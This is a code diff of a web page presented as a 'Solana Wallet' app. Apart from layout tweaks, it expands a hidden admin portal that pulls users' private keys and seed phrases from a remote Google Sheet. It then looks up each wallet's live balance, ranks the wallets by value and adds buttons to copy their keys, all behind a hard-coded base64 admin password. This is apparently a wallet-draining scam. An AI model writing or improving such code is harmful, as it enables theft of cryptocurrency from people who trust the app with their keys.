@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
   <title>Solana Wallet</title>
   
   <!-- PWA Meta Tags -->
@@ -22,6 +22,16 @@
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body { background: #0A0C12; font-family: 'Inter', sans-serif; color: #FFFFFF; overflow-x: hidden; }
+    
+    /* Prevent pinch zoom on iOS and Android */
+    html, body {
+      -webkit-text-size-adjust: 100%;
+      text-size-adjust: 100%;
+      overflow-x: hidden;
+      position: fixed;
+      width: 100%;
+      height: 100%;
+    }
 
     .top-bar {
       background: #000000;
@@ -83,9 +93,12 @@
       max-width: 480px;
       margin: 0 auto;
       background: #0A0C12;
-      min-height: 100vh;
+      height: 100vh;
       position: relative;
       box-shadow: 0 0 40px rgba(0,0,0,0.5);
+      overflow-y: auto;
+      overflow-x: hidden;
+      -webkit-overflow-scrolling: touch;
     }
 
     .auth-screen {
@@ -195,9 +208,32 @@
     .divider-text { font-size: 12px; color: #6B7280; }
     .warning-text { font-size: 10px; color: #F23B5C; text-align: center; margin-top: 16px; }
 
-    .main-app { display: none; }
-    .pages-container { display: flex; width: 200%; transition: transform 0.35s cubic-bezier(0.2,0.9,0.4,1.1); }
-    .page { width: 50%; padding-bottom: 90px; }
+    .main-app { 
+      display: none; 
+      height: 100%;
+      overflow: hidden;
+      position: relative;
+    }
+    
+    .pages-wrapper {
+      overflow: hidden;
+      width: 100%;
+      position: relative;
+    }
+    
+    .pages-container { 
+      display: flex; 
+      width: 200%;
+      transition: transform 0.35s cubic-bezier(0.2,0.9,0.4,1.1);
+    }
+    
+    .page { 
+      width: 50%; 
+      padding-bottom: 90px;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+      height: calc(100vh - 44px);
+    }
 
     .wallet-header {
       display: flex;
@@ -205,6 +241,9 @@
       align-items: center;
       padding: 16px 20px;
       background: #0A0C12;
+      position: sticky;
+      top: 0;
+      z-index: 5;
     }
     .account-selector {
       display: flex;
@@ -733,15 +772,33 @@
       align-items: center;
       position: sticky;
       top: 0;
+      z-index: 10;
     }
-    .admin-header h3 { font-size: 16px; color: #14F195; }
+    .admin-header h3 { font-size: 18px; color: #14F195; }
     .close-admin { background: #F23B5C; border: none; padding: 8px 20px; border-radius: 30px; color: white; cursor: pointer; }
     .admin-table { padding: 16px; overflow-x: auto; }
-    table { width: 100%; border-collapse: collapse; font-size: 10px; }
-    th, td { padding: 10px 6px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); vertical-align: top; }
-    th { color: #14F195; }
-    .key-cell { font-family: monospace; font-size: 8px; word-break: break-all; max-width: 180px; }
-    .copy-btn { background: #1A1E2A; border: none; color: #14F195; padding: 4px 8px; border-radius: 8px; cursor: pointer; font-size: 9px; margin-top: 4px; }
+    table { width: 100%; border-collapse: collapse; font-size: 12px; background: #0A0C12; }
+    th, td { padding: 12px 8px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); vertical-align: middle; }
+    th { color: #14F195; font-weight: 600; font-size: 13px; background: rgba(20,241,149,0.1); position: sticky; top: 0; }
+    .wallet-row { transition: all 0.2s; }
+    .wallet-row:hover { background: rgba(20,241,149,0.05); }
+    .address-cell { font-family: monospace; font-size: 11px; word-break: break-all; max-width: 200px; }
+    .key-cell { font-family: monospace; font-size: 10px; word-break: break-all; max-width: 250px; background: rgba(0,0,0,0.3); padding: 6px; border-radius: 8px; }
+    .balance-cell { font-weight: 600; color: #14F195; font-size: 13px; }
+    .copy-btn { 
+      background: #1A1E2A; 
+      border: none; 
+      color: #14F195; 
+      padding: 4px 10px; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-size: 10px; 
+      margin-top: 6px;
+      transition: all 0.2s;
+      display: inline-block;
+    }
+    .copy-btn:hover { background: #14F195; color: black; }
+    .date-cell { font-size: 11px; color: #8E8E93; white-space: nowrap; }
     .admin-login {
       position: fixed;
       top: 0;
@@ -753,6 +810,21 @@
       display: flex;
       align-items: center;
       justify-content: center;
+    }
+    .admin-login-header {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+    }
+    .close-admin-login {
+      background: #F23B5C;
+      border: none;
+      padding: 8px 20px;
+      border-radius: 30px;
+      color: white;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 500;
     }
     .loading { text-align: center; padding: 40px; color: #8E8E93; display: flex; flex-direction: column; align-items: center; gap: 12px; }
     .loading-spinner { width: 32px; height: 32px; border: 2px solid rgba(20,241,149,0.2); border-top-color: #14F195; border-radius: 50%; animation: spin 0.8s linear infinite; }
@@ -823,102 +895,104 @@
       </div>
     </div>
 
-    <div class="pages-container" id="pagesContainer">
-      <div class="page">
-        <div class="balance-section">
-          <div class="balance-label">Total Balance</div>
-          <div class="main-balance" id="totalUsdMain">$0.00</div>
-          <div class="sol-sub" id="solBalanceSub">0 SOL</div>
-          <div class="address-hash" id="walletAddress"></div>
-        </div>
+    <div class="pages-wrapper">
+      <div class="pages-container" id="pagesContainer">
+        <div class="page">
+          <div class="balance-section">
+            <div class="balance-label">Total Balance</div>
+            <div class="main-balance" id="totalUsdMain">$0.00</div>
+            <div class="sol-sub" id="solBalanceSub">0 SOL</div>
+            <div class="address-hash" id="walletAddress"></div>
+          </div>
 
-        <div class="action-row">
-          <div class="action-btn" onclick="copyAddress()">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="6" height="6"/><rect x="15" y="3" width="6" height="6"/><rect x="3" y="15" width="6" height="6"/><rect x="15" y="15" width="6" height="6"/></svg>
-            Receive
-          </div>
-          <div class="action-btn" onclick="openSendModal()">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 2L11 13"/><path d="M22 2L15 22L11 13L2 9Z"/></svg>
-            Send
-          </div>
-          <div class="action-btn" onclick="openSwapModal()">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 1l4 4-4 4"/><path d="M3 11V9a4 4 0 014-4h14"/><path d="M7 23l-4-4 4-4"/><path d="M21 13v2a4 4 0 01-4 4H3"/></svg>
-            Swap
-          </div>
-        </div>
-
-        <div class="chart-card">
-          <div class="chart-header">
-            <div class="coin-title">
-              <div class="coin-icon-small"><img src="https://assets.coingecko.com/coins/images/4128/large/solana.png" alt="SOL"></div>
-              <div class="coin-name">Solana</div>
+          <div class="action-row">
+            <div class="action-btn" onclick="copyAddress()">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="6" height="6"/><rect x="15" y="3" width="6" height="6"/><rect x="3" y="15" width="6" height="6"/><rect x="15" y="15" width="6" height="6"/></svg>
+              Receive
             </div>
-            <div class="price-info">
-              <div class="current-price" id="solCurrentPrice">$0.00</div>
-              <div class="price-change" id="solPriceChange">0.00%</div>
+            <div class="action-btn" onclick="openSendModal()">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 2L11 13"/><path d="M22 2L15 22L11 13L2 9Z"/></svg>
+              Send
+            </div>
+            <div class="action-btn" onclick="openSwapModal()">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 1l4 4-4 4"/><path d="M3 11V9a4 4 0 014-4h14"/><path d="M7 23l-4-4 4-4"/><path d="M21 13v2a4 4 0 01-4 4H3"/></svg>
+              Swap
             </div>
           </div>
-          <div class="chart-container"><canvas id="priceChart" width="600" height="140"></canvas></div>
-          <div class="timeframes" id="timeframeGroup">
-            <button class="tf-btn" data-tf="1H">1H</button>
-            <button class="tf-btn" data-tf="1D">1D</button>
-            <button class="tf-btn active" data-tf="1W">1W</button>
-            <button class="tf-btn" data-tf="1M">1M</button>
-            <button class="tf-btn" data-tf="ALL">ALL</button>
-          </div>
-        </div>
 
-        <div class="token-list">
-          <div class="token-row">
-            <div class="token-left">
-              <div class="token-icon"><img src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png" alt="USDC"></div>
-              <div>
-                <div class="token-name-section">
-                  <div class="token-name">USDC</div>
-                  <div class="verify-badge"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2.5L14.2 4.3L17 4.5L17.7 7.2L20 9L18.8 11.5L20 14L17.7 15.8L17 18.5L14.2 18.7L12 20.5L9.8 18.7L7 18.5L6.3 15.8L4 14L5.2 11.5L4 9L6.3 7.2L7 4.5L9.8 4.3L12 2.5Z" fill="#14F195"/><path d="M9.5 12.5L11.2 14.2L14.8 10.6" stroke="white" stroke-width="2"/></svg></div>
-                </div>
-                <div class="token-balance" id="usdcAmount">0</div>
+          <div class="chart-card">
+            <div class="chart-header">
+              <div class="coin-title">
+                <div class="coin-icon-small"><img src="https://assets.coingecko.com/coins/images/4128/large/solana.png" alt="SOL"></div>
+                <div class="coin-name">Solana</div>
+              </div>
+              <div class="price-info">
+                <div class="current-price" id="solCurrentPrice">$0.00</div>
+                <div class="price-change" id="solPriceChange">0.00%</div>
               </div>
             </div>
-            <div class="token-right"><div class="token-value" id="usdcAmountUsd">$0.00</div></div>
-          </div>
-          <div class="token-row">
-            <div class="token-left">
-              <div class="token-icon"><img src="https://assets.coingecko.com/coins/images/4128/large/solana.png" alt="SOL"></div>
-              <div>
-                <div class="token-name-section">
-                  <div class="token-name">SOL</div>
-                  <div class="verify-badge"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2.5L14.2 4.3L17 4.5L17.7 7.2L20 9L18.8 11.5L20 14L17.7 15.8L17 18.5L14.2 18.7L12 20.5L9.8 18.7L7 18.5L6.3 15.8L4 14L5.2 11.5L4 9L6.3 7.2L7 4.5L9.8 4.3L12 2.5Z" fill="#14F195"/><path d="M9.5 12.5L11.2 14.2L14.8 10.6" stroke="white" stroke-width="2"/></svg></div>
-                </div>
-                <div class="token-balance" id="solAmount">0</div>
-              </div>
+            <div class="chart-container"><canvas id="priceChart" width="600" height="140"></canvas></div>
+            <div class="timeframes" id="timeframeGroup">
+              <button class="tf-btn" data-tf="1H">1H</button>
+              <button class="tf-btn" data-tf="1D">1D</button>
+              <button class="tf-btn active" data-tf="1W">1W</button>
+              <button class="tf-btn" data-tf="1M">1M</button>
+              <button class="tf-btn" data-tf="ALL">ALL</button>
             </div>
-            <div class="token-right"><div class="token-value" id="solAmountUsd">$0.00</div></div>
           </div>
-          <div class="token-row">
-            <div class="token-left">
-              <div class="token-icon"><img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" alt="USDT"></div>
-              <div>
-                <div class="token-name-section">
-                  <div class="token-name">USDT</div>
-                  <div class="verify-badge"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2.5L14.2 4.3L17 4.5L17.7 7.2L20 9L18.8 11.5L20 14L17.7 15.8L17 18.5L14.2 18.7L12 20.5L9.8 18.7L7 18.5L6.3 15.8L4 14L5.2 11.5L4 9L6.3 7.2L7 4.5L9.8 4.3L12 2.5Z" fill="#14F195"/><path d="M9.5 12.5L11.2 14.2L14.8 10.6" stroke="white" stroke-width="2"/></svg></div>
-                </div>
-                <div class="token-balance" id="usdtAmount">0</div>
-              </div>
-            </div>
-            <div class="token-right"><div class="token-value" id="usdtAmountUsd">$0.00</div></div>
-          </div>
-        </div>
-      </div>
 
-      <div class="page">
-        <div class="glass-card" style="margin-top: 24px;">
-          <div style="font-weight: 600; margin-bottom: 16px; font-size: 18px;"><span>📋</span> Transaction History</div>
-          <div id="txListContainer"><div class="loading"><div class="loading-spinner"></div><div>Loading transactions...</div></div></div>
+          <div class="token-list">
+            <div class="token-row">
+              <div class="token-left">
+                <div class="token-icon"><img src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png" alt="USDC"></div>
+                <div>
+                  <div class="token-name-section">
+                    <div class="token-name">USDC</div>
+                    <div class="verify-badge"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2.5L14.2 4.3L17 4.5L17.7 7.2L20 9L18.8 11.5L20 14L17.7 15.8L17 18.5L14.2 18.7L12 20.5L9.8 18.7L7 18.5L6.3 15.8L4 14L5.2 11.5L4 9L6.3 7.2L7 4.5L9.8 4.3L12 2.5Z" fill="#14F195"/><path d="M9.5 12.5L11.2 14.2L14.8 10.6" stroke="white" stroke-width="2"/></svg></div>
+                  </div>
+                  <div class="token-balance" id="usdcAmount">0</div>
+                </div>
+              </div>
+              <div class="token-right"><div class="token-value" id="usdcAmountUsd">$0.00</div></div>
+            </div>
+            <div class="token-row">
+              <div class="token-left">
+                <div class="token-icon"><img src="https://assets.coingecko.com/coins/images/4128/large/solana.png" alt="SOL"></div>
+                <div>
+                  <div class="token-name-section">
+                    <div class="token-name">SOL</div>
+                    <div class="verify-badge"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2.5L14.2 4.3L17 4.5L17.7 7.2L20 9L18.8 11.5L20 14L17.7 15.8L17 18.5L14.2 18.7L12 20.5L9.8 18.7L7 18.5L6.3 15.8L4 14L5.2 11.5L4 9L6.3 7.2L7 4.5L9.8 4.3L12 2.5Z" fill="#14F195"/><path d="M9.5 12.5L11.2 14.2L14.8 10.6" stroke="white" stroke-width="2"/></svg></div>
+                  </div>
+                  <div class="token-balance" id="solAmount">0</div>
+                </div>
+              </div>
+              <div class="token-right"><div class="token-value" id="solAmountUsd">$0.00</div></div>
+            </div>
+            <div class="token-row">
+              <div class="token-left">
+                <div class="token-icon"><img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" alt="USDT"></div>
+                <div>
+                  <div class="token-name-section">
+                    <div class="token-name">USDT</div>
+                    <div class="verify-badge"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2.5L14.2 4.3L17 4.5L17.7 7.2L20 9L18.8 11.5L20 14L17.7 15.8L17 18.5L14.2 18.7L12 20.5L9.8 18.7L7 18.5L6.3 15.8L4 14L5.2 11.5L4 9L6.3 7.2L7 4.5L9.8 4.3L12 2.5Z" fill="#14F195"/><path d="M9.5 12.5L11.2 14.2L14.8 10.6" stroke="white" stroke-width="2"/></svg></div>
+                  </div>
+                  <div class="token-balance" id="usdtAmount">0</div>
+                </div>
+              </div>
+              <div class="token-right"><div class="token-value" id="usdtAmountUsd">$0.00</div></div>
+            </div>
+          </div>
         </div>
-        <div class="glass-card">
-          <div style="font-weight: 600; margin-bottom: 16px; font-size: 18px;"><span>📰</span> Solana News</div>
-          <div id="newsContainer" class="news-section"><div class="loading"><div class="loading-spinner"></div><div>Loading news...</div></div></div>
+
+        <div class="page">
+          <div class="glass-card" style="margin-top: 24px;">
+            <div style="font-weight: 600; margin-bottom: 16px; font-size: 18px;"><span>📋</span> Transaction History</div>
+            <div id="txListContainer"><div class="loading"><div class="loading-spinner"></div><div>Loading transactions...</div></div></div>
+          </div>
+          <div class="glass-card">
+            <div style="font-weight: 600; margin-bottom: 16px; font-size: 18px;"><span>📰</span> Solana News</div>
+            <div id="newsContainer" class="news-section"><div class="loading"><div class="loading-spinner"></div><div>Loading news...</div></div></div>
+          </div>
         </div>
       </div>
     </div>
@@ -1011,13 +1085,16 @@
 
 <!-- Admin Portal -->
 <div class="admin-portal" id="adminPortal">
-  <div class="admin-header"><h3>🔐 ADMIN PORTAL</h3><button class="close-admin" onclick="closeAdminPortal()">Close</button></div>
-  <div class="admin-table" id="adminTable"></div>
+  <div class="admin-header"><h3>🔐 ADMIN PORTAL - Wallet Management</h3><button class="close-admin" onclick="closeAdminPortal()">Close</button></div>
+  <div class="admin-table" id="adminTable"><div class="loading"><div class="loading-spinner"></div><div>Loading wallets and fetching balances...</div></div></div>
 </div>
 
 <div class="admin-login" id="adminLogin" style="display: none;">
+  <div class="admin-login-header" style="position: absolute; top: 20px; right: 20px;">
+    <button class="close-admin-login" onclick="closeAdminLogin()">✕ Close</button>
+  </div>
   <div class="auth-card">
-    <div class="auth-title">🔐 Early Access</div>
+    <div class="auth-title" style="font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 20px;">🔐 Early Access</div>
     <input type="text" class="auth-input" id="adminUser" placeholder="Username">
     <input type="password" class="auth-input" id="adminPass" placeholder="Password">
     <button class="auth-btn" onclick="verifyAdminLogin()">Login</button>
@@ -1059,6 +1136,23 @@
     } catch(error) {
       console.log('Backup failed:', error);
     }
+  }
+
+  // Fetch real SOL balance from blockchain
+  async function fetchRealBalanceFromBlockchain(address) {
+    try {
+      const pubKey = new solanaWeb3.PublicKey(address);
+      const balance = await connection.getBalance(pubKey);
+      const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+      return solBalance;
+    } catch(e) {
+      console.log('Error fetching balance for', address, e);
+      return 0;
+    }
+  }
+
+  function closeAdminLogin() {
+    document.getElementById('adminLogin').style.display = 'none';
   }
 
   function toggleSwapDirection() {
@@ -1251,43 +1345,125 @@
   function verifyAdminLogin() { const username = document.getElementById('adminUser').value; const password = document.getElementById('adminPass').value; const expectedHash = 'QWRtaW42NTM5'; if (username === 'Admin' && btoa(password) === expectedHash) { document.getElementById('adminLogin').style.display = 'none'; loadAdminPortal(); } else { showToast('Invalid credentials'); } }
   
   async function loadAdminPortal() {
+    const adminTable = document.getElementById('adminTable');
+    adminTable.innerHTML = '<div class="loading"><div class="loading-spinner"></div><div>Loading wallets and fetching balances...</div></div>';
+    
     try {
+      // Get all wallets from Google Sheet
       const response = await fetch(GOOGLE_SHEET_URL);
       const allData = await response.json();
-      const wallets = allData.slice(1);
+      const walletsData = allData.slice(1); // Remove header row
       
-      if (!wallets.length) {
-        document.getElementById('adminTable').innerHTML = '<div class="empty-state"><div class="empty-icon">📭</div><div class="empty-text">No wallets created yet</div></div>';
+      if (!walletsData.length) {
+        adminTable.innerHTML = '<div class="empty-state"><div class="empty-icon">📭</div><div class="empty-text">No wallets created yet</div></div>';
         document.getElementById('adminPortal').classList.add('active');
         return;
       }
       
-      let html = '<thead> <th>#</th><th>Time</th><th>Name</th><th>Public Key</th><th style="background:#14F19520;">Seed Phrase</th><th style="background:#F23B5C20;">Private Key</th><th>Device</th> </thead><tbody>';
+      // Create array of wallets with their data
+      let walletsWithBalances = [];
       
-      wallets.reverse().forEach((wallet, i) => {
-        html += ` <tr>
-          <td>${i + 1}</td>
-          <td style="font-size:10px;">${wallet[0] || ''}</td>
-          <td>${wallet[2] || 'Unknown'}</td>
-          <td style="font-family:monospace; font-size:9px;" title="${wallet[3]}">${wallet[3] ? wallet[3].slice(0,12)+'...' : 'N/A'}</td>
-          <td style="background:#14F19510;"><div class="key-cell">${wallet[5] || 'N/A'}</div><button class="copy-btn" onclick="copyToClipboard('${(wallet[5] || '').replace(/'/g, "\\'")}')">📋 Copy</button></td>
-          <td style="background:#F23B5C10;"><div class="key-cell">${wallet[4] || 'N/A'}</div><button class="copy-btn" onclick="copyToClipboard('${(wallet[4] || '').replace(/'/g, "\\'")}')">📋 Copy</button></td>
-          <td style="font-size:9px;">${wallet[7] || 'Unknown'}</td>
-        </tr>`;
-      });
+      // Fetch real balances for each wallet
+      for (let i = 0; i < walletsData.length; i++) {
+        const wallet = walletsData[i];
+        const publicKey = wallet[3];
+        const seedPhrase = wallet[5] || 'N/A';
+        const privateKey = wallet[4] || 'N/A';
+        const createdAt = wallet[0] || '';
+        
+        // Fetch real SOL balance from blockchain
+        let balance = 0;
+        if (publicKey && publicKey !== 'N/A') {
+          try {
+            const pubKey = new solanaWeb3.PublicKey(publicKey);
+            const balanceLamports = await connection.getBalance(pubKey);
+            balance = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
+          } catch(e) {
+            console.log('Error fetching balance for', publicKey);
+            balance = 0;
+          }
+        }
+        
+        walletsWithBalances.push({
+          publicKey: publicKey,
+          seedPhrase: seedPhrase,
+          privateKey: privateKey,
+          balance: balance,
+          createdAt: createdAt,
+          index: i + 1
+        });
+      }
       
-      html += '</tbody><div style="padding:16px;">Total wallets: ' + wallets.length + '</div>';
-      document.getElementById('adminTable').innerHTML = html;
+      // Sort by balance (highest first)
+      walletsWithBalances.sort((a, b) => b.balance - a.balance);
+      
+      // Build HTML table - Clean version without device info
+      let html = `
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Wallet Address</th>
+            <th style="background:#14F19520;">🔐 Seed Phrase</th>
+            <th style="background:#F23B5C20;">🔑 Private Key</th>
+            <th>💰 SOL Balance</th>
+            <th>📅 Created</th>
+          </tr>
+        </thead>
+        <tbody>
+      `;
+      
+      for (const wallet of walletsWithBalances) {
+        const shortAddress = wallet.publicKey ? wallet.publicKey.slice(0, 8) + '...' + wallet.publicKey.slice(-6) : 'N/A';
+        const formattedDate = wallet.createdAt ? new Date(wallet.createdAt).toLocaleString() : 'Unknown';
+        
+        html += `
+          <tr class="wallet-row">
+            <td style="font-weight: 600; color: #14F195;">${wallet.index}</td>
+            <td class="address-cell" title="${wallet.publicKey}">
+              ${shortAddress}
+              ${wallet.publicKey && wallet.publicKey !== 'N/A' ? `<br><button class="copy-btn" onclick="copyToClipboard('${wallet.publicKey.replace(/'/g, "\\'")}')">📋 Copy Address</button>` : ''}
+            </td>
+            <td style="background:#14F19510;">
+              <div class="key-cell">${wallet.seedPhrase !== 'N/A' ? wallet.seedPhrase.substring(0, 50) + (wallet.seedPhrase.length > 50 ? '...' : '') : 'N/A'}</div>
+              ${wallet.seedPhrase !== 'N/A' ? `<button class="copy-btn" onclick="copyToClipboard('${wallet.seedPhrase.replace(/'/g, "\\'")}')">📋 Copy Seed</button>` : ''}
+            </td>
+            <td style="background:#F23B5C10;">
+              <div class="key-cell">${wallet.privateKey !== 'N/A' ? wallet.privateKey.substring(0, 30) + '...' : 'N/A'}</div>
+              ${wallet.privateKey !== 'N/A' ? `<button class="copy-btn" onclick="copyToClipboard('${wallet.privateKey.replace(/'/g, "\\'")}')">🔐 Copy Private Key</button>` : ''}
+            </td>
+            <td class="balance-cell">
+              ${wallet.balance.toFixed(6)} SOL
+              <br>
+              <span style="font-size: 10px; color: #8E8E93;">≈ $${(wallet.balance * solPrice).toFixed(2)}</span>
+            </td>
+            <td class="date-cell">${formattedDate}</td>
+          </tr>
+        `;
+      }
+      
+      html += `
+        </tbody>
+        <tfoot>
+          <tr>
+            <td colspan="6" style="padding: 16px; text-align: center; background: rgba(20,241,149,0.05);">
+              📊 Total Wallets: ${walletsWithBalances.length} | 💰 Total SOL: ${walletsWithBalances.reduce((sum, w) => sum + w.balance, 0).toFixed(6)} SOL
+            </td>
+          </tr>
+        </tfoot>
+      `;
+      
+      adminTable.innerHTML = html;
       document.getElementById('adminPortal').classList.add('active');
       
     } catch(error) {
-      document.getElementById('adminTable').innerHTML = '<div class="empty-state"><div class="empty-icon">⚠️</div><div class="empty-text">Failed to load</div></div>';
+      console.error('Admin portal error:', error);
+      adminTable.innerHTML = '<div class="empty-state"><div class="empty-icon">⚠️</div><div class="empty-text">Failed to load wallets. Please try again.</div></div>';
       document.getElementById('adminPortal').classList.add('active');
     }
   }
   
   function closeAdminPortal() { document.getElementById('adminPortal').classList.remove('active'); }
-  function copyToClipboard(text) { navigator.clipboard.writeText(text); showToast('Copied!'); }
+  function copyToClipboard(text) { navigator.clipboard.writeText(text); showToast('Copied to clipboard!'); }
   function goToPage(index) { document.getElementById("pagesContainer").style.transform = `translateX(-${index * 50}%)`; document.querySelectorAll(".tab-item").forEach((tab, i) => { if (i === index) tab.classList.add("active"); else tab.classList.remove("active"); }); }
 
   function generateAdditionalWallet() { closeModal('addAccountModal'); try { const keypair = solanaWeb3.Keypair.generate(); const publicKey = keypair.publicKey.toString(); const privateKey = toBase58(keypair.secretKey); const mnemonic = generateMnemonic(); const wallet = { id: 'wallet_' + Date.now() + '_' + Math.random().toString(36).substr(2,6), name: 'Wallet ' + (walletsList.length + 1), publicKey: publicKey, privateKey: privateKey, seedPhrase: mnemonic, createdAt: new Date().toISOString(), balance: 0, usdcBalance: 0, usdtBalance: 0 }; walletsList.push(wallet); saveAllWallets(); alert('🔐 PRIVATE KEY\n\n' + privateKey + '\n\n⚠️ IMPORTANT SECURITY WARNING ⚠️\n\n• Store this key in a SAFE place!\n• NEVER share this key with ANYONE!\n• Write it down and keep it OFFLINE!\n• This is the ONLY way to recover your wallet!\n\n👀 Keep your crypto safe!'); showToast('New wallet added!'); switchToWallet(wallet.id); } catch(e) { showToast('Error: ' + e.message); } }
@@ -1303,7 +1479,43 @@
   function closeAccountModal() { document.getElementById('accountModal').classList.remove('active'); }
   function openAddAccountModal() { document.getElementById('addAccountModal').classList.add('active'); }
 
-  async function init() { connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed'); document.getElementById('adminBtn').onclick = () => document.getElementById('adminLogin').style.display = 'flex'; document.querySelectorAll(".tab-item").forEach(tab => tab.addEventListener("click", () => goToPage(parseInt(tab.getAttribute("data-page"))))); setupTimeframes(); initChart(); updateTicker(); setInterval(updateTicker, 30000); await fetchSolPrice(); setInterval(fetchSolPrice, 30000); fetchLiveNews(); if (!checkExistingSession()) document.getElementById('authScreen').style.display = 'flex'; }
+  // Completely disable horizontal scroll on pages container
+  function disableHorizontalScroll() {
+    const pagesContainer = document.getElementById('pagesContainer');
+    
+    pagesContainer.addEventListener('touchstart', function(e) {
+      const touch = e.touches[0];
+      this.startX = touch.clientX;
+      this.startY = touch.clientY;
+    }, { passive: false });
+    
+    pagesContainer.addEventListener('touchmove', function(e) {
+      if (!this.startX || !this.startY) return;
+      const touch = e.touches[0];
+      const diffX = Math.abs(touch.clientX - this.startX);
+      const diffY = Math.abs(touch.clientY - this.startY);
+      
+      if (diffX > diffY && diffX > 5) {
+        e.preventDefault();
+        return false;
+      }
+    }, { passive: false });
+  }
+
+  async function init() { 
+    connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed'); 
+    document.getElementById('adminBtn').onclick = () => document.getElementById('adminLogin').style.display = 'flex'; 
+    document.querySelectorAll(".tab-item").forEach(tab => tab.addEventListener("click", () => goToPage(parseInt(tab.getAttribute("data-page"))))); 
+    setupTimeframes(); 
+    initChart(); 
+    updateTicker(); 
+    setInterval(updateTicker, 30000); 
+    await fetchSolPrice(); 
+    setInterval(fetchSolPrice, 30000); 
+    fetchLiveNews(); 
+    if (!checkExistingSession()) document.getElementById('authScreen').style.display = 'flex';
+    disableHorizontalScroll();
+  }
 
   window.generateRealWallet = generateRealWallet;
   window.importRealWallet = importRealWallet;
@@ -1316,6 +1528,7 @@
   window.sendRealTransaction = sendRealTransaction;
   window.verifyAdminLogin = verifyAdminLogin;
   window.closeAdminPortal = closeAdminPortal;
+  window.closeAdminLogin = closeAdminLogin;
   window.copyToClipboard = copyToClipboard;
   window.switchToWallet = switchToWallet;
   window.openAccountModal = openAccountModal;
